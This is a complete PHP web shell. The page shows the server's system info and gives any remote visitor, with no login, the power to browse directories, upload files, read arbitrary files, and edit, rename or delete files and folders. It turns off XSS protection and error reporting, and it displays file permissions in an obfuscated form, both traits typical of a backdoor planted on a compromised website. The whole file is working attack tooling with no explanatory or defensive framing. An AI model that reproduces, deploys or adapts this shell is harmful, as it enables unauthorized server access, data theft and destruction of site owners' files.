  <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
echo '<html>
<center>
<body>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
';
echo "<font color='green'>".php_uname()."</font></tr></td></center></table>";
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';
if(isset($_GET['j'])){
$j = $_GET['j'];
}else{
$j = getcwd();
}
$j = str_replace('\\','/',$j);
$paths = explode('/',$j);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?j=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?j=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '<br><br><br><font color="black"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:black;;" required/></font>
<input type="submit" value="U" style="width:85px;height:25px"/>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$j.'/'.$_FILES['file']['name'])){
echo '<br><br><font color="green">OK</font><br/>';
}else{
echo '<script>alert("NO")</script>';
}
}
echo '</form></td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <textarea  style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 1200px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['j'].'<br /><br />';
if($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&j='.$cwd.'&opt=delete&type=buat" method="POST"><input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
<input type="hidden" name="j" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value=">>>" style="width:100px; height: 30px;"/>
</form>';
}
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['j'],$j.'/'.$_POST['newname'])){
echo '<br><br><font color="green">OK</font><br/>';
}else{
echo '<script>alert("NO")</script>';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST"><input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.$_POST['name'].'" />
<input type="hidden" name="j" value="'.$_POST['j'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value=">>>" style="height:30px;" />
</form>';
}
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['j'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<br><br><font color="green">OK</font><br/>';
}else{
echo '<script>alert("NO")</script>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 1000px;">'.htmlspecialchars(file_get_contents($_POST['j'])).'</textarea><br />
<input type="hidden" name="j" value="'.$_POST['j'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value=">>>" style="height:30px; width:70px;"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'g'){
if(rmdir($_POST['j'])){
echo '<br><br><font color="green">OK</font><br/>';
}else{
echo '<script>alert("NO")</script>>';
}
}
elseif($_POST['type'] == 'file'){
if(unlink($_POST['j'])){
echo '<br><br><font color="green">OK</font><br/>';
}else{
echo '<script>alert("NO")</script>';
}
}
}
?>
<?php
echo '</center>';
$scandir = scandir($j);
$pa = getcwd();
echo '<div id="content"><table width="95%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>';
foreach($scandir as $g){
if(!is_dir("$j/$g") || $g == '.' || $g == '..') continue;
echo "<tr>
<td class=td_home>D<a href=\"?j=$j/$g\"> $g</a></td>
<td class=td_home><center>D</center></td>
<td class=td_home><center>";
if(is_writable("$j/$g")) echo '<font color="black">';
elseif(!is_readable("$j/$g")) echo '<font color="red">';
echo z("$j/$g");
if(is_writable("$j/$g") || !is_readable("$j/$g")) echo '</font>';
echo "</center></td>
<td class=td_home align=right> <form method=\"POST\" action=\"?option&j=$j\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15\">
<option value=\"Action\">+</option>
<option value=\"delete\">Delete</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"g\">
<input type=\"hidden\" name=\"j\" value=\"$j/$g\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15\"/>
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$j/$file")) continue;
$size = filesize("$j/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
echo "<tr>
<td class=td_home>F<a href=\"?filesrc=$j/$file&j=$j\"> $file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$j/$file")) echo '<font color="green">';
elseif(!is_readable("$j/$file")) echo '<font color="red">';
echo z("$j/$file");
if(is_writable("$j/$file") || !is_readable("$j/$file")) echo '</font>';
echo "</center></td>
<td class=td_home align=right> <form method=\"POST\" action=\"?option&j=$j\">
<select name=\"opt\" style=\"margin-top:6px;width:100px;font-family:Kelly Slab;font-size:15\">
<option value=\"Action\">+</option>
<option value=\"delete\">Delete</option>
<option value=\"edit\">Edit</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"j\" value=\"$j/$file\">
<input type=\"submit\" value=\">\" style=\"margin-top:6px;width:27;font-family:Kelly Slab;font-size:15\"/>
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
function z($file){
$z = fileperms($file);
if (($z & 0xC000) == 0xC000) {
$info = 's';
} elseif (($z & 0xA000) == 0xA000) {
$info = '4';
} elseif (($z & 0x8000) == 0x8000) {
$info = '0';
} elseif (($z & 0x6000) == 0x6000) {
$info = '3';
} elseif (($z & 0x4000) == 0x4000) {
$info = '3';
} elseif (($z & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($z & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = '5';
}
$info .= (($z & 0x0100) ? '2' : '0');
$info .= (($z & 0x0080) ? '1' : '0');
$info .= (($z & 0x0040) ?
(($z & 0x0800) ? 's' : '6' ) :
(($z & 0x0800) ? 'S' : '0'));
$info .= (($z & 0x0020) ? '2' : '0');
$info .= (($z & 0x0010) ? '1' : '0');
$info .= (($z & 0x0008) ?
(($z & 0x0400) ? 's' : '6' ) :
(($z & 0x0400) ? 'S' : '0'));
$info .= (($z & 0x0004) ? '2' : '0');
$info .= (($z & 0x0002) ? '1' : '0');
$info .= (($z & 0x0001) ?
(($z & 0x0200) ? 't' : '6' ) :
(($z & 0x0200) ? 'T' : '0'));
return $info;
}
?>